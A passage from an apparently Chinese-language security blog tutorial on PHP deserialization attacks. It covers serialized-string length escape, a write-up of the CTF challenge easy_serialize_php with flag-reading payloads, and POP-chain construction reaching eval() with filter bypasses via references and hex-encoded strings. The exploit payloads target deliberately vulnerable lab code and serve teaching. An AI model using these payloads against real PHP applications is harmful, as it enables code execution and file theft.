class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//变少</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">变长是通过将s:后的长度变长，导致可以将不是自己的序列化的东西也收进来</span><br><span class=\"line\">变少是通过将自己本来序列化后不是一个对象的值缩到一个对象中，那么其他缩的对象值就空了，我们就可以覆盖了</span><br><span class=\"line\"></span><br><span class=\"line\">https://www.secpulse.com/archives/165222.html</span><br></pre></td></tr></table></figure>\n<p>比如：[安洵杯 2019] easy_serialize_php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$function</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;f&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$img</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filter_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;flag&#x27;</span>,<span class=\"string\">&#x27;php5&#x27;</span>,<span class=\"string\">&#x27;php4&#x27;</span>,<span class=\"string\">&#x27;fl1g&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;|&#x27;</span>,<span class=\"variable\">$filter_arr</span>).<span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$filter</span>,<span class=\"string\">&#x27;&#x27;</span>,<span class=\"variable\">$img</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unset</span>(<span class=\"variable\">$_SESSION</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&quot;user&quot;</span>] = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;function&#x27;</span>] = <span class=\"variable\">$function</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$_POST</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$function</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;img_path&#x27;</span>])&#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;img&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;guest_img.png&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;img&#x27;</span>] = <span class=\"title function_ invoke__\">sha1</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;img_path&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$serialize_info</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$_SESSION</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;phpinfo();&#x27;</span>); <span class=\"comment\">//maybe you can find something in here!</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;show_image&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$userinfo</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serialize_info</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$userinfo</span>[<span class=\"string\">&#x27;img&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于有了上面的基础，这边就简单缩缩了</p>\n<p>首先能造成对象逃逸的关键是 <code>    $serialize_info = filter(serialize($_SESSION));</code> ，将 filter 里面的东西替换为空，导致字符变动，但序列化后的长度值没有变动</p>\n<p>exxtract () 函数从数组中将变量导入到当前的符号表 (本题的作用是将_SESSION 的两个函数变为 post 传参)</p>\n<p>同时题目告诉我们的 phpinfo 中 <code>d0g3_fllllllag</code>  可以判断 flag 位置</p>\n<p>我们可以通过改变 img_path 的内容或者直接改变 userinfo [‘img’] 的内容来达到读取 flag 的目的</p>\n<p>0x00 键值逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：</span><br><span class=\"line\">_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:1:&quot;2&quot;;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag和php是敏感字符，在使用的时候被过滤掉了，但序列化记录的字符串长度没有过滤掉，所以在序列化的时候</span><br><span class=\"line\">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;2&quot;;&#125;被当作了原来的value</span><br><span class=\"line\">在 echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));实现了读取flag的，目的</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115171618604.png\" alt=\"image-20221115171618604\"></p>\n<p>0x01 键名逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class=\"line\">过滤前</span><br><span class=\"line\">a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class=\"line\">过滤后</span><br><span class=\"line\">a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class=\"line\">下面的步骤和值替换一样</span><br><span class=\"line\">这里的键名变为&quot;;s:48: 实现了逃逸</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05pop-链利用\"><a class=\"markdownIt-Anchor\" href=\"#0x05pop-链利用\">#</a> 0x05POP 链利用</h4>\n<p>上面的例子都是基于 &quot;自动调用&quot; 的 magic function。** 但当漏洞 / 危险代码存在类的普通方法中，就不能指望通过 &quot;自动调用&quot; 来达到目的了。** 这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。</p>\n<p><strong>1. 一些有用的 POP 链中出现的方法：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- 命令执行：exec()、passthru()、popen()、system()</span><br><span class=\"line\">- 文件操作：file_put_contents()、file_get_contents()、unlink()</span><br><span class=\"line\">- 代码执行：eval()、assert()、call_user_func()   //call_user_func(assert,phpinfo());</span><br></pre></td></tr></table></figure>\n<p><strong>2. 反序列化中为了避免信息丢失，使用大写 S 支持字符串的编码。</strong></p>\n<p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示 (避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:4:&quot;user&quot;; -&gt; S:4:&quot;use\\72&quot;;</span><br></pre></td></tr></table></figure>\n<p><strong>3. 深浅 copy</strong></p>\n<p>在 php 中如果我们使用 &amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$A = &amp;$B; </span><br></pre></td></tr></table></figure>\n<p><strong>4. 利用 PHP 伪协议</strong></p>\n<p>配合 PHP 伪协议实现文件包含、命令执行等漏洞。如 glob:// 伪协议查找匹配的文件路径模式。</p>\n<h4 id=\"0x06\"><a class=\"markdownIt-Anchor\" href=\"#0x06\">#</a> 0x06</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class main &#123;</span><br><span class=\"line\">    protected $ClassObj;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct() &#123;</span><br><span class=\"line\">        $this-&gt;ClassObj = new normal();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct() &#123;</span><br><span class=\"line\">        $this-&gt;ClassObj-&gt;action();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class normal &#123;</span><br><span class=\"line\">    function action() &#123;</span><br><span class=\"line\">        echo &quot;hello bmjoker&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class evil &#123;</span><br><span class=\"line\">    private $data;</span><br><span class=\"line\">    function action() &#123;</span><br><span class=\"line\">        eval($this-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//$a = new main();</span><br><span class=\"line\">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>危险的命令执行方法 eval 不在魔术方法中，在 evil 类中。但是魔术方法__construct () 是调用 normal 类，__destruct () 在程序结束时会去调用 normal 类中的 action () 方法。而我们最终的目的是去调用 evil 类中的 action () 方法，并伪造 evil 类中的变量data，达成任意代码执行的目的。这样的话可以尝试去构造POP利用链，让魔术方法__construct()去调用evil这个类，并且给变量 data 赋予恶意代码，比如 php 探针 phpinfo ()，这样就相当于执行 <code>&lt;?php eval(&quot;phpinfo();&quot;)?&gt;</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$ClassObj</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">evil</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = <span class=\"string\">&quot;phpinfo()&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">main</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者这样构造也行</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$ClassObj</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;ClassObj = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">evil</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = <span class=\"string\">&quot;phpinfo();&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">main</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>但是由于<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>O</mi><mi>b</mi><mi>j</mi><mtext>是</mtext><mi>p</mi><mi>r</mi><mi>o</mi><mi>t</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>e</mi><mi>d</mi><mtext>类型修饰，</mtext></mrow><annotation encoding=\"application/x-tex\">ClassObj是protected类型修饰，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord cjk_fallback\">类</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">修</span><span class=\"mord cjk_fallback\">饰</span><span class=\"mord cjk_fallback\">，</span></span></span></span>data 是 private 类型修饰，在序列化的时候，多出来的字节都被 \\x00 填充，需要进行在代码中使用 urlencode 对序列化后字符串进行编码，否则无法复制解析。</p>\n<p>或者直接改不可见字符为 %00</p>\n<p>url 地址栏中会自动帮我们解析一次 url 编码</p>\n</blockquote>\n<h4 id=\"0x07\"><a class=\"markdownIt-Anchor\" href=\"#0x07\">#</a> 0x07</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyFile</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$user</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$user</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;user = <span class=\"variable\">$user</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$this</span>-&gt;name, <span class=\"string\">&quot;flag&quot;</span>)!==False) </span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;/etc/hostname&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;/etc/passwd&quot;</span>; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;user = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>]; </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;input&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;input&#x27;</span>]; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$input</span>, <span class=\"string\">&#x27;user&#x27;</span>)!==False)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Hacker&#x27;</span>); </span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$input</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>像如上代码比较复杂的可以先定位魔术方法与漏洞触发点。在代码中发现__toString () 魔术方法调用了 file_get_contents () 来读取变量name的数据。当程序执行结束或者变量销毁时就会自动调用析构函数__destruct()并使用echo输出变量，__toString()方法在此时会被自动调用。关键在于如果能控制变量 name，就可以造成任意文件读取漏洞。但是通读代码发现前端传入的可控数据只有变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mtext>，并且传入的</mtext></mrow><annotation encoding=\"application/x-tex\">user，并且传入的</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">并</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">的</span></span></span></span> user 还不能包含 “user” 子符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">paload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class MyFile &#123;</span><br><span class=\"line\">    public $name = &#x27;/etc/hosts&#x27;;</span><br><span class=\"line\">    public $user = &#x27;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = new MyFile();</span><br><span class=\"line\">$a-&gt;name = &amp;$a-&gt;user;</span><br><span class=\"line\">$b = serialize($a);</span><br><span class=\"line\">$b = str_replace(&quot;user&quot;, &quot;use\\\\72&quot;, $b);</span><br><span class=\"line\">$b = str_replace(&quot;s&quot;, &quot;S&quot;, $b);</span><br><span class=\"line\">var_dump($b);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//通过浅拷贝绕过 if(stristr($this-&gt;name, &quot;flag&quot;)!==False) </span><br><span class=\"line\">//通过十六进制绕过if(stristr($input, &#x27;user&#x27;)!==False)</span><br></pre></td></tr></table></figure>\n<p>一般 POP 链都是反着程序来生成，将我们要实现的代码序列化，传入程序进行反序列化 ，就可以让程序按照我们的想法执行。</p>\n<h4 id=\"0x08\"><a class=\"markdownIt-Anchor\" href=\"#0x08\">#</a> 0x08</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span 